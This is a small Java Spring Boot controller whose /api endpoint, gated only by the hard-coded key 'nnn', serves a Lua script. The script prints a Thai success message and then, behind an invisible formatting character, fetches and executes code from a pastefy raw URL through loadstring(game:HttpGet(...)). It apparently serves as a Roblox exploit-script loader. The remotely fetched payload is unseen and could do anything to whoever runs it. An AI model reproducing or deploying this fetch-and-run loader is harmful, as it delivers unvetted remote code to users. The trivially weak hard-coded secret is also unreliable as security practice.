package com.example.api;

import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

@RestController
public class ApiController {

    @GetMapping("/api")
    public ResponseEntity<String> getScript(
            @RequestParam(required = false) String key
    ) {

        String secretKey = "nnn";

        if (secretKey.equals(key)) {
            String lua = """
print("ZeIoNhUb: โหลดสำเร็จ!")
‎loadstring(game:HttpGet("https://pastefy.app/ZChRHTrQ/raw"))()
""";
            return ResponseEntity.ok(lua);
        } else {
            return ResponseEntity.status(403).body("Forbidden");
        }
    }
}
